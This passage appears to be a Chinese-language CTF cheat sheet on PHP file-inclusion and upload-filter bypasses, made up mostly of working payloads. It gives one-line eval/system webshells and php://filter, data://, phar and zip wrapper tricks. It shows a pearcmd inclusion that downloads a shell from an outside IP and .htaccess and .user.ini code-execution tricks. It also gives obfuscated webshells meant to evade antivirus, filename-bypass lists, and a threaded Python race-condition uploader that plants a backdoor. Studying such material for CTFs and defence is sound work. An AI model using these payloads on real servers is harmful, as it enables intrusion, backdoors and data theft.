<li><code>http://127.0.0.1/?filename=file:///etc/passwd</code></li>
</ul>
</li>
</ul>
<h3 id="php"><a href="#php" class="headerlink" title="php://"></a><code>php://</code></h3><ul>
<li>条件：<ul>
<li><code>allow_url_fopen</code>：不受影响</li>
<li><code>allow_url_include</code>：仅 <code>php://input</code>、<code>php://stdin</code>、<code>php://memory</code>、<code>php://temp</code> 需要 <code>on</code>。</li>
</ul>
</li>
<li>作用：访问各个输入 &#x2F; 输出流（I&#x2F;O streams）</li>
<li>说明：<ul>
<li>PHP 提供了一些杂项输入 &#x2F; 输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</li>
<li><code>php://input</code> 可以访问请求的原始数据的只读流。如果启用了 <code>enable_post_data_reading</code> 选项，<code>php://input</code> 在使用 <code>enctype=&quot;multipart/form-data&quot;</code> 的 POST 请求中不可用。</li>
<li><code>php://output</code> 只写的数据流，允许你以 <code>print</code> 和 <code>echo</code> 一样的方式写入到输出缓冲区。</li>
<li><code>php://fd</code> (&gt;&#x3D;5.3.6) 允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</li>
<li><code>php://memory</code>、<code>php://temp</code> (&gt;&#x3D;5.1.0) 类似文件包装器的数据流，允许读写临时数据。两者的一个区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。<code>php://temp</code> 的内存限制可通过添加 <code>/maxmemory:NN</code> 来控制，NN 是以字节为单位、保留在内存的最大数据量，超过则使用临时文件。</li>
<li><code>php://filter/[read|write]=过滤器名称/resource=filename</code><ul>
<li><code>read</code> 操作：在读取数据时应用过滤器。</li>
<li><code>write</code> 操作：在写入数据时应用过滤器。</li>
<li>过滤器：<ul>
<li><code>string.rot13</code>：对数据进行 ROT13 变换。</li>
<li><code>string.toupper</code>：将字符串转换为大写。</li>
<li><code>string.tolower</code>：将字符串转换为小写。</li>
<li><code>convert.base64-encode</code>：将数据进行 Base64 编码。</li>
<li><code>convert.base64-decode</code>：将数据进行 Base64 解码。</li>
<li><code>convert.quoted-printable-encode</code>：将数据进行 Quoted-Printable 编码。</li>
<li><code>convert.quoted-printable-decode</code>：将数据进行 Quoted-Printable 解码。</li>
<li><code>convert.iconv.UTF-8/ISO-8859-1</code>：将数据从 UTF-8 编码转换为 ISO-8859-1 编码（iconv 需要安装）。</li>
<li><code>zlib.deflate</code>：对数据进行 DEFLATE 压缩。</li>
<li><code>zlib.inflate</code>：对数据进行 DEFLATE 解压缩。</li>
<li><code>zlib.encode</code>：对数据进行 gzip 编码。</li>
<li><code>zlib.decode</code>：对数据进行 gzip 解码。</li>
</ul>
</li>
</ul>
</li>
<li><code>resource=php://input</code>：读取请求的原始数据。</li>
<li><code>resource=php://stdin</code>：读取标准输入。</li>
<li><code>resource=php://stdout</code>：写入标准输出。</li>
<li><code>resource=php://stderr</code>：写入标准错误输出。</li>
</ul>
</li>
<li>示例：<ul>
<li><code>file_put_contents(a,b)</code> 将 b 的内容写入 a 中，正好触发了 write</li>
<li><code>file_get_contents()</code> 直接触发 read</li>
</ul>
</li>
</ul>
<h3 id="用-phar-协议"><a href="#用-phar-协议" class="headerlink" title="用 phar 协议"></a>用 phar 协议</h3><ul>
<li>创建一个一句话木马文件 <code>1.php</code>，内容为：<code>&lt;?php @system($_GET[0]);?&gt;</code>。然后压缩成 zip 文件，随后修改后缀名为 <code>.png</code> 或者 <code>.jpg</code>，上传该文件。</li>
<li>示例：<ul>
<li><code>?file=phar://upload/1.jpg/1&amp;0=cat%20/f1aaaag</code></li>
</ul>
</li>
</ul>
<h3 id="用-zip-协议"><a href="#用-zip-协议" class="headerlink" title="用 zip 协议"></a>用 zip 协议</h3><ul>
<li>压缩成 zip 文件，随后修改后缀名为 <code>.png</code> 或者 <code>.jpg</code>，上传该文件。</li>
<li>示例：<ul>
<li><code>?file=zip://upload/1.jpg%231&amp;0=cat /f1aaggggg</code></li>
</ul>
</li>
</ul>
<h3 id="绕过死亡-die"><a href="#绕过死亡-die" class="headerlink" title="绕过死亡 die"></a>绕过死亡 die</h3><ul>
<li>需要 URL 编码：<ul>
<li><code>GET: ?file=php://filter/write=convert.base64-decode/resource=1.php</code></li>
<li><code>?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30</code></li>
</ul>
</li>
<li>需要 base64 编码，编码后最前面添加两个字母如：<code>aa</code>：<ul>
<li><code>POST: content=&lt;?php system(&#39;cat f*&#39;);</code></li>
<li><code>content=aaPD9waHAgcGhwaW5mbygpOz8+</code></li>
</ul>
</li>
<li>或：<ul>
<li>需要 URL 编码：<ul>
<li><code>GET: ?file=php://filter/write=string.rot13/resource=1.php</code></li>
<li><code>?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%32%25%36%66%25%37%34%25%33%31%25%33%33%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%32%25%32%65%25%37%30%25%36%38%25%37%30</code></li>
</ul>
</li>
</ul>
</li>
<li>需要 Rot13 编码：<ul>
<li><code>POST: content=&lt;?php system(&#39;cat f*&#39;);</code></li>
<li><code>content=&lt;?cuc cucvasb();?&gt;</code></li>
</ul>
</li>
<li>或：<ul>
<li><code>?file=php://filter/write=string.strip_tags|convert.base64-decode/resource=3.php</code></li>
<li><code>/?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%33%25%37%34%25%37%32%25%36%39%25%37%30%25%35%66%25%37%34%25%36%31%25%36%37%25%37%33%25%37%63%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%33%25%32%65%25%37%30%25%36%38%25%37%30</code></li>
<li><code>post传入 &lt;?php phpinfo();</code></li>
<li><code>PD9waHAgcGhwaW5mbygpOw==</code></li>
</ul>
</li>
<li>或：<ul>
<li><code>file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</code></li>
<li><code>post: contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?</code></li>
</ul>
</li>
</ul>
<h1 id="文件包含配合伪协议"><a href="#文件包含配合伪协议" class="headerlink" title="文件包含配合伪协议"></a>文件包含配合伪协议</h1><ul>
<li><code>include($file)</code></li>
<li>示例：<ul>
<li><code>?file=php://filter/convert.base64-encode/resource=flag.php</code></li>
<li><code>?file=php://filter/convert.%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%44%25%36%35%25%36%45%25%36%33%25%36%46%25%36%34%25%36%35/resource=flag.php   //二次编码解很多题</code></li>
<li><code>?data://text/plain,&lt;?php system(&#39;ls&#39;);?&gt;</code></li>
<li><code>?file=data://text/plain;base64,PD89c3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==   //&lt;?=system(&#39;tac flag.php&#39;);?&gt;</code></li>
<li><code>?file=php://filter/convert.iconv.ASCII.UCS-2BE/resource=flag.php</code></li>
<li><code>?file=compress.zlib:///var/www/html/flag.php</code></li>
<li><code>compress.zlib://data:@baidu.com/baidu.com,phpinfo() 构造思路：</code>@<code>使</code>data:<code>被解释为用户名和密码 baidu.com/baidu.com 只要它包含了 /，通常被认为是合法的 media-type。作为有效的压缩流，而是将整个 URL 作为字面文本读取了。file_get_contents结果是phpinfo()</code></li>
<li><code>?file=phar://test.zip/shell.txt   //相对路径 phar	把shell.txt压缩成test.zip文件</code></li>
</ul>
</li>
</ul>
<h1 id="包含-htaccess-文件"><a href="#包含-htaccess-文件" class="headerlink" title="包含 .htaccess 文件"></a>包含 .htaccess 文件</h1><ul>
<li>示例：<ul>
<li><code>php_value auto_append_file /tmp/webshell.txt</code></li>
<li><code>php_value auto_append_file /temp/sess_xxxxxx</code></li>
<li><code>先执行其他php完再包含/tmp/webshell</code></li>
<li><code>自己包含自己会将注释句子一起执行</code></li>
<li><code>php_value auto_append_file .htaccess</code></li>
<li><code>#&lt;?php echo(123);eval($_POST[0]);?&gt;</code></li>
</ul>
</li>
</ul>
<h1 id="见到-shtml-考虑-ssi"><a href="#见到-shtml-考虑-ssi" class="headerlink" title="见到 shtml 考虑 ssi"></a>见到 shtml 考虑 ssi</h1><ul>
<li>示例：<ul>
<li><code>.htaccess</code></li>
<li><code>AddType text/html .shtml</code></li>
<li><code>AddHandler server_parsed .shtml</code></li>
<li><code>Options Includes</code></li>
<li><code>1.shtml</code></li>
<li><code>&lt;pre&gt;</code></li>
<li><code>&lt;!--#exec cmd=&quot;whomai&quot;--&gt;</code></li>
<li><code>&lt;/pre&gt;</code></li>
</ul>
</li>
</ul>
<h1 id="传统条件竞争不可取"><a href="#传统条件竞争不可取" class="headerlink" title="传统条件竞争不可取"></a>传统条件竞争不可取</h1><ul>
<li>示例：<ul>
<li><code>条件竞争php7.0</code></li>
<li><code>file=php://filter/strip_tags/resource=/ect/passwd  会报错不执行</code></li>
<li><code>post传文件就直接永久保存下来，在phpinfo界面找file包含即可</code></li>
<li><code>自包含(题中的包含或者.htaccess包含 php_value auto_append_file 1.txt)，上传，phpinfo页面，这几个保证在一个界面，在自包含下给phpinfo界面传文件，</code></li>
<li><code>自包含shell</code></li>
<li><code>1.txt</code></li>
<li><code>&lt;?</code></li>
<li><code>echo (&#39;1.txt is ready&#39;);</code></li>
<li><code>file_put_contents(&#39;/tmp/shell.php&#39;,&#39;&lt;?php echo(&#39;haha,is OK&#39;);eval($_POST[0]);?&gt;&#39;);</code></li>
</ul>
</li>
</ul>
<h1 id="日志文件包含"><a href="#日志文件包含" class="headerlink" title="日志文件包含"></a>日志文件包含</h1><ul>
<li>示例：<ul>
<li><code>/var/log/nginx/access.log，利用ua头即可包含</code></li>
</ul>
</li>
</ul>
<h1 id="包含-environ-文件"><a href="#包含-environ-文件" class="headerlink" title="包含 environ 文件"></a>包含 environ 文件</h1><ul>
<li>条件：<ul>
<li><code>php以cgi方式运行，这样environ才会保持UA头。</code></li>
<li><code>environ文件存储位置已知，且environ文件可读。</code></li>
<li><code>每个用户都有属于自己的environ环境</code></li>
</ul>
</li>
</ul>
<h1 id="session-文件包含"><a href="#session-文件包含" class="headerlink" title="session 文件包含"></a>session 文件包含</h1><ul>
<li>示例：<ul>
<li><code>能赋值就直接赋值包含</code></li>
<li><code>不行就进度条</code></li>
<li><code>/tem/sess_PHPSESSID</code></li>
<li><code>/var/lib/php/session/sess_PHPSESSID</code></li>
<li><code>这里的PHPSESSID是cookie当用户控制时（session.use_struct_mode开）随便写入，利用session进度条，利用写的HTML，随便传抓包，确保有Cookie: PHPSESSID=xxxxxxx并找到其位置  /sess_xxxxxx</code></li>
<li><code>默认是一直删除，所以一直重发session页面的包，并且一直重发包含session文件的页面包含进去</code></li>
</ul>
</li>
</ul>
<h1 id="pear-文件包含"><a href="#pear-文件包含" class="headerlink" title="pear 文件包含"></a>pear 文件包含</h1><ul>
<li>条件：<ul>
<li><code>1 有文件包含点</code></li>
<li><code>2 开启了pear扩展</code></li>
<li><code>3 配置文件中register_argc_argv 设置为On,而默认为Off</code></li>
</ul>
</li>
<li>说明：<ul>
<li><code>PEAR扩展</code></li>
<li><code>PHP Extension and Application Repository</code></li>
<li><code>默认安装位置是  /usr/local/lib/php/</code></li>
<li><code>包含测试?file=/usr/local/lib/php/pearcmd.php&amp;version</code></li>
</ul>
</li>
<li>利用 Pear 扩展进行文件包含<ul>
<li>方法一 远程文件下载<ul>
<li>示例：<ul>
<li><code>?file=/usr/local/lib/php/pearcmd.php&amp;ctfshow+install+-R+/var/www/html/+http://47.236.120.83/shell.php  //shell密码是cmd</code></li>
</ul>
</li>
</ul>
</li>
<li>方法二 生成配置文件，配置项传入我们恶意的php代码的形式<ul>
<li>上传 <code>ctfshow.php</code><ul>
<li>示例：<ul>
<li><code>a=b</code></li>
<li><code>username=root</code></li>
<li><code>man_dir=&lt;?php eval($_POST[1]);?&gt;</code></li>
</ul>
</li>
<li>示例：<ul>
<li><code>GET /?file=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/ctf.php+-d+man_dir=&lt;?eval($_POST[1]);?&gt;+-s+</code></li>
</ul>
</li>
<li>然后直接利用密码是1</li>
</ul>
</li>
</ul>
</li>
<li>方法三 写配置文件方式<ul>
<li>示例：<ul>
<li><code>GET /?file=/usr/local/lib/php/pearcmd.php&amp;aaaa+config-create+/var/www/html/&lt;?=</code>$_POST[1]<code>;?&gt;+1.php</code></li>
<li>访问 <code>http://&lt;靶场服务器IP&gt;/1.php</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h1><ul>
<li>说明：<ul>
<li>通过域转数字的形式，可以不用.来构造远程文件地址</li>
<li>示例：<ul>
<li><code>http://www.msxindl.com/tools/ip/ip_num.asp</code></li>
<li><code>?file=http://731540450/1</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="open-basedir-突破"><a href="#open-basedir-突破" class="headerlink" title="open_basedir 突破"></a>open_basedir 突破</h1><ul>
<li>说明：<ul>
<li>利用闭合直接 <code>glob</code> 获取根目录的文件名</li>
<li>示例：<ul>
<li><code>?&gt;&lt;?php</code></li>
<li><code>var_dump(scandir(&#39;glob:///*&#39;));?&gt;</code></li>
</ul>
</li>
</ul>
</li>
<li>或者利用 <code>glob+DirectoryIterator</code> 获取根目录的文件名，新建 <code>glob.php</code> 文件，内容如下<ul>
<li>示例：<ul>
<li><code>&lt;?php</code></li>
<li><code>$it = new DirectoryIterator(&quot;glob:///*&quot;);</code></li>
<li><code>foreach($it as $f) &#123;</code></li>
<li><code>echo $f-&gt;__toString().&quot;&lt;br/&gt;&quot;;</code></li>
<li><code>&#125;</code></li>
<li><code>直接通过蚁剑链接，将glob.php上传再访问找到flag名</code></li>
</ul>
</li>
</ul>
</li>
<li>利用 <code>ini_set、mkdir、chdir</code> 来获取文件内容，新建 <code>flag.php</code> 文件，内容如下<ul>
<li>示例：<ul>
<li><code>&lt;?php</code></li>
<li><code>mkdir(&#39;tmpdir&#39;); chdir(&#39;tmpdir&#39;);</code></li>
<li><code>ini_set(&#39;open_basedir&#39;,&#39;..&#39;);</code></li>
<li><code>chdir(&#39;..&#39;); chdir(&#39;..&#39;); chdir(&#39;..&#39;); chdir(&#39;..&#39;); chdir(&#39;..&#39;);</code></li>
<li><code>ini_set(&#39;open_basedir&#39;,&#39;/&#39;);</code></li>
<li><code>$a=file_get_contents(&#39;/f11aggg&#39;);</code></li>
<li><code>var_dump($a);</code></li>
<li><code>?&gt;</code></li>
<li>访问即可得到flag</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="nginx-大文件上传缓存文件利用"><a href="#nginx-大文件上传缓存文件利用" class="headerlink" title="nginx 大文件上传缓存文件利用"></a>nginx 大文件上传缓存文件利用</h1><h1 id="pcache-扩展生成缓存文件利用"><a href="#pcache-扩展生成缓存文件利用" class="headerlink" title="pcache 扩展生成缓存文件利用"></a>pcache 扩展生成缓存文件利用</h1><ul>
<li>有任意文件读取，前面双写绕过&#x2F;.的过滤</li>
<li>示例：<ul>
<li><code>/?tpl=...//...//...//...//...//...//...//...//etc/passwd</code></li>
</ul>
</li>
<li>flag 在 <code>flag.php</code> 里，源码对最后一个.后的后缀名进行判断，无法直接绕过读取flag.php，查看phpinfo</li>
<li>示例：<ul>
<li><code>/?tpl=debug</code></li>
<li><code>发现开启了opcache，它会缓存php文件进入指定缓存文件夹，路径为缓存文件夹/[system_id]/var/www/html/flag.php.bin</code></li>
<li>只要访问这个bin文件即可绕过后缀过滤，查看phpinfo发现缓存文件夹为 <code>/var/www/a/</code></li>
<li>主要是计算 <code>system_id</code>，有现成工具 <code>php7-opcache-override(https://github.com/GoSecure/php7-opcache-override)</code></li>
<li><code>用法：</code><ul>
<li><code>python3 system_id_scraper.py info.html 或者 python3 system_id_scraper.py url</code></li>
<li><code># info.html为phpinfo的前端信息界面另存为所得</code></li>
<li><code># url为phpinfo地址</code></li>
<li>示例：<ul>
<li><code>算出system_id为1116d566fdc53f79abce6c01e3a0308d</code></li>
<li><code>所以先访问flag.php使其产生缓存文件（这一步必须要），之后执行访问如下进行包含即可</code></li>
<li><code>/?tpl=...//...//...//...//...//...//...//...//var/www/a/1116d566fdc53f79abce6c01e3a0308d/var/www/html/flag.php.bin</code></li>
<li><code>#flag&#123;Opcache_Succ_ess!!&#125;</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id=""><a href="#" class="headerlink" title="&lt;?php 的绕过"></a><code>&lt;?php</code> 的绕过</h2><ul>
<li>示例：<ul>
<li><code>&lt;?=</code> </li>
<li><code>&lt;script language=&#39;php&#39;&gt;phpinfo();&lt;/script&gt;</code></li>
<li><code>&lt;% phpinfo();%&gt; //asp tag少</code></li>
</ul>
</li>
<li>思路是找过滤，是内容还是后缀，是白还是黑</li>
</ul>
<h2 id="前端-js-检查"><a href="#前端-js-检查" class="headerlink" title="前端 js 检查"></a>前端 js 检查</h2><ul>
<li>示例：<ul>
<li>后改为 bp</li>
<li>图片头 <code>GIF89A</code> 为第一行</li>
<li>加入带马的图片</li>
</ul>
</li>
</ul>
<h3 id="shell-总结"><a href="#shell-总结" class="headerlink" title="shell 总结"></a>shell 总结</h3><ul>
<li>示例：<ul>
<li><code>&lt;?echo (&#39;123&#39;);eval($_POST[0]);?&gt;</code></li>
<li><code>&lt;?=eval($_POST&#123;1&#125;);?&gt; //过滤[]</code></li>
<li><code>&lt;?=system(&#39;tac ../f*&#39;)?&gt; //过滤&#123;&#125;[]</code></li>
<li><code>&lt;script language=”php”&gt;echo &#39;123&#39;; &lt;/script&gt;</code></li>
<li><code>&lt;?= eval(array_pop($_REQUEST))?&gt;</code></li>
<li><code>&lt;?= @eval(array_pop($_POST))?&gt; //传1=system(&#39;ls /&#39;)</code></li>
<li>上传完shell无论是jpg还是php直接包含</li>
<li>示例：<ul>
<li><code>?file=upload/1.jpg&amp;0=tac%20Flag_is_here_acffd72.php</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><ul>
<li>示例：<ul>
<li><code>利用fuzz方法快速测试可上传后缀：upload-fuzz-dic-builder()</code></li>
<li>项目地址：<a target="_blank" rel="noopener" href="https://github.com/c0ny1/upload-fuzz-dic-builder">https://github.com/c0ny1/upload-fuzz-dic-builder</a></li>
<li>用法：<code>python2 upload-fuzz-dic-builder.py -n shell -a jpg  -l php -m apache --os linux  -o upload_file.txt</code></li>
<li>双写：<ul>
<li>php后缀名大小写、点绕过、空格绕过、::$DATA绕过、冒号绕过（Windows特性）</li>
<li>php支持的可解析别名：php2, php3, php4, php5, phps, pht, phtm, phtml</li>
</ul>
</li>
</ul>
</li>
<li><code>.user.ini</code> 上传，先发图片再改为这个 <code>.user.ini</code> 名字<ul>
<li>但是这种方式其实是有个前提的，因为 <code>.user.ini</code> 只对他同一目录下的文件起作用，也就是说，只有他同目录下有php文件才可以。</li>
<li>示例：<ul>
<li><code>1.写入内容auto_prepend_file=1.txt 再上传1.txt的马不行就写&lt;?=eval($_COOKIE[1]); 传COOKIE：1=eval(base64_decode(&#39;cGhwaW5mbygpOw==&#39;))?&gt;</code></li>
<li><code>2.写入内容auto_prepend_file=php://input</code></li>
<li><code>上传完直接随便发个东西在bp直接传码就行</code></li>
<li><code>3.写入内容auto_prepend_file=/var/log/nginx/access.log</code></li>
<li><code>上传后ua写码&lt;?php eval($_POST[1]);?&gt;木马，插入日志后就不写ua头直接rce就行，POST不行就COOKIE&lt;?php eval($_COOKIE[1]);?&gt; 1=eval(base64_decode(&#39;&#39;))?&gt;COOKIE不解析空格</code></li>
<li><code>4..user.ini写入内容</code></li>
<li><code>GIF89a</code></li>
<li><code>auto_prepend_file=/tmp/sess_shell</code></li>
<li><code>用session进度条post发包并拦截，马是&lt;?php @eval($_POST[&quot;pass&quot;]);?&gt;</code></li>
<li><code>改Cookie:PHPSESSID=shell,在PHP_SESSION_UPLOAD_PROGRESS的主体的最后一行写&lt;?php fwrite(fopen(&#39;1.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;pass&quot;]);?&gt;&#39;);?&gt;</code></li>
<li><code>将该POST数据包与访问upload目录的GET数据包进行条件竞争，访问upload的数据包长度发生变化即创建后门文件成功</code></li>
</ul>
</li>
</ul>
</li>
<li><code>.htaccess</code> 文件<ul>
<li>方式1：<ul>
<li><code>AddType application/x-httpd-php .png   //将.png后缀的文件解析 成php</code></li>
<li>还支持 <code>AddType application/x-httpd-ph\p .png</code></li>
</ul>
</li>
<li>方式2：<ul>
<li><code>&lt;FilesMatch &quot;png&quot;&gt;</code></li>
<li><code>SetHandler application/x-httpd-php</code></li>
<li><code>&lt;/FilesMatch&gt;</code></li>
<li>如果flag不是php文件，那么还可以像 <code>.user.ini</code> 一样在当前目录加载一个文件</li>
<li>示例：<ul>
<li><code>php_value auto_append_file &#39;flag&#39;</code></li>
</ul>
</li>
</ul>
</li>
<li>基于 <code>.htaccess</code> 的盲注</li>
</ul>
</li>
</ul>
<h2 id="基础免杀"><a href="#基础免杀" class="headerlink" title="基础免杀"></a>基础免杀</h2><ul>
<li>示例：<ul>
<li><code>&lt;?php</code></li>
<li><code>$a = &quot;s#y#s#t#e#m&quot;;</code></li>
<li><code>$b = explode(&quot;#&quot;,$a);</code></li>
<li><code>$c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];</code></li>
<li><code>$c($_REQUEST[1]);</code></li>
<li><code>?&gt;</code></li>
</ul>
</li>
<li>示例：<ul>
<li><code>&lt;?php</code></li>
<li><code>$a=substr(&#39;1s&#39;,1).&#39;ystem&#39;;</code></li>
<li><code>$a($_REQUEST[1]);</code></li>
<li><code>?&gt;</code></li>
</ul>
</li>
<li>示例：<ul>
<li><code>&lt;?php</code></li>
<li><code>$a=strrev(&#39;metsys&#39;);</code></li>
<li><code>$a($_REQUEST[1]);</code></li>
<li><code>?&gt;</code></li>
</ul>
</li>
<li>示例：<ul>
<li><code>&lt;?php</code></li>
<li><code>$a=$_REQUEST[&#39;a&#39;];</code></li>
<li><code>$b=$_REQUEST[&#39;b&#39;];</code></li>
<li><code>$a($b);</code></li>
<li><code>?&gt;</code></li>
</ul>
</li>
<li>图像检测函数<ul>
<li><code>mime_content_type</code></li>
<li><code>getimagesize和exif_imagetype函数</code><ul>
<li>以上3个函数都是通过检查文件的幻数判断文件的类别。可以直接下列命令制作后门jpg文件进行绕过。</li>
<li>示例：<ul>
<li><code>打开 cmd，导航到包含 safe.jpg 和 shell.php 文件的目录，然后运行命令</code></li>
<li><code>copy safe.jpg /b + shell.php /a shell.jpg</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="文件移动函数"><a href="#文件移动函数" class="headerlink" title="文件移动函数"></a>文件移动函数</h2><ul>
<li>示例：<ul>
<li><code>move_uploaded_file函数会忽略掉文件末尾的/.</code></li>
</ul>
</li>
</ul>
<h2 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h2><ul>
<li>示例：<ul>
<li><code>IIS5.X/6.0</code><ul>
<li><code>目录解析：如果目录采取/1.asp/的命令方式，那么访问该目录下的文件会默认以asp的方式执行</code></li>
<li><code>文件解析：iis读取到;会默认结束，可以用1.asp;.jpg的形式进行绕过</code></li>
<li><code>特殊后缀：1.asa、1.cer、1.cdx</code></li>
</ul>
</li>
<li><code>IIS7/7.5</code><ul>
<li>如果配置中开启 <code>cgi.fix_pathinf</code></li>
<li>同 <code>nginx</code> 解析漏洞</li>
</ul>
</li>
<li><code>Apache解析漏洞</code><ul>
<li><code>解析漏洞:从右到左判断后缀并解析（低版本）</code></li>
<li><code>123.php.asaa：Apache会先判断asaa不认识，那就会判断.php它认识就默认以这种方式进行解析。</code></li>
</ul>
</li>
<li><code>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</code><ul>
<li>示例：<ul>
<li><code>shell.php%0a</code></li>
</ul>
</li>
</ul>
</li>
<li><code>Nginx解析漏洞</code><ul>
<li>示例：<ul>
<li><code>hack.jpg/1.php</code></li>
<li><code>nginx看到文件扩展名是.php，便不管该文件是否存在，直接交给php处理，然后php的默认配置下看到右边的文件不存在，便删去最后的文件名，读取前一个，所以将.jpg处理成为php</code></li>
</ul>
</li>
</ul>
</li>
<li><code>nginx 文件名逻辑漏洞（CVE-2013-4547）</code><ul>
<li>示例：<ul>
<li><code>shell.gif[0x20][0x00].php</code></li>
</ul>
</li>
</ul>
</li>
<li><code>Windows环境</code><ul>
<li>示例：<ul>
<li><code>shell.php.jpg</code></li>
<li><code>此时目录中会生成shell.php文件，但内容为空。再利用PHP和Windows环境的叠加属性：</code></li>
<li><code>再上传shell.&gt;&gt;&gt;来匹配并覆盖shell.php</code></li>
<li><code>shell.php::$DATA</code></li>
<li><code>shell.php </code>（php后有个空格）</li>
<li><code>shell.php.</code></li>
</ul>
</li>
</ul>
</li>
<li><code>shell.phtml</code></li>
<li><code>shell.php%00</code></li>
<li><code>shell.gif[0x20][0x00].php</code></li>
<li><code>shell.php.jpg</code></li>
<li><code>shell.pphphp</code></li>
<li><code>shell.PHP</code></li>
<li><code>shell.php.jpg</code></li>
</ul>
</li>
</ul>
<h2 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h2><ul>
<li>示例：<ul>
<li><code>先移动，后检测，不符合再删除，符合则改名字</code></li>
<li><code>使用多线程并发进行上传与访问操作</code></li>
<li><code>查看源代码发现只能上传zip	那我们直接上传一句话就可以了	注意修改Content-Type为application/x-zip-compressed</code></li>
<li><code>然后直接文件包含就可以了</code></li>
</ul>
</li>
</ul>
<h2 id="条件竞争绕过"><a href="#条件竞争绕过" class="headerlink" title="条件竞争绕过"></a>条件竞争绕过</h2><ul>
<li>示例：<ul>
<li><code>查看页面源代码，明显的条件竞争，新建一个文件shell.php，内容如下</code><ul>
<li><code>&lt;?php fputs(fopen(&quot;info.php&quot;, &quot;w&quot;), &#39;&lt;?php @eval($_POST[&quot;key&quot;]);?&gt;&#39;); ?&gt;</code></li>
</ul>
</li>
<li>执行如下脚本进行竞争上传<ul>
<li>示例：<ul>
<li><code># -*- coding:utf-8 -*-</code></li>
<li><code>import requests</code></li>
<li><code>import threading</code></li>
<li><code>import os</code></li>
<li><code>class RaceCondition(threading.Thread):</code><ul>
<li><code>def __init__(self):</code><ul>
<li><code>threading.Thread.__init__(self)</code></li>
<li><code>self.url = &#39;http://192.168.13.140:8011/uploads/shell.php&#39; #上传的文件地址</code></li>
<li><code>self.uploadUrl = &#39;http://192.168.13.140:8011/index.php&#39; #上传文件的地址</code></li>
</ul>
</li>
<li><code>def _get(self):</code><ul>
<li><code>print(&#39;try to call uploaded file...&#39;)</code></li>
<li><code>r = requests.get(self.url)</code></li>
<li><code>if r.status_code == 200:</code><ul>
<li><code>print(&#39;[*] create file info.php success.&#39;)</code></li>
<li><code>os._exit(0)</code></li>
</ul>
</li>
</ul>
</li>
<li><code>def _upload(self):</code><ul>
<li><code>print(&#39;upload file...&#39;)</code></li>
<li><code>file = &#123;&#39;myfile&#39;: open(&#39;shell.php&#39;, &#39;r&#39;)&#125; #本地脚本木马</code></li>
<li><code>requests.post(self.uploadUrl, files=file)</code></li>
</ul>
</li>
<li><code>def run(self):</code><ul>
<li><code>while True:</code><ul>
<li><code>for i in range(5):</code><ul>
<li><code>self._get()</code></li>
</ul>
</li>
<li><code>for i in range(10):</code><ul>
<li><code>self._upload()</code></li>
<li><code>self._get()</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><code>if __name__ == &#39;__main__&#39;:</code><ul>
<li><code>threads = 50</code></li>
<li><code>for i in range(threads):</code><ul>
<li><code>t = RaceCondition()</code></li>
<li><code>t.start()</code></li>
</ul>
</li>
<li><code>for i in range(threads):</code><ul>
<li><code>t.join()</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><code>成功后访问./uploads/info.php</code></li>
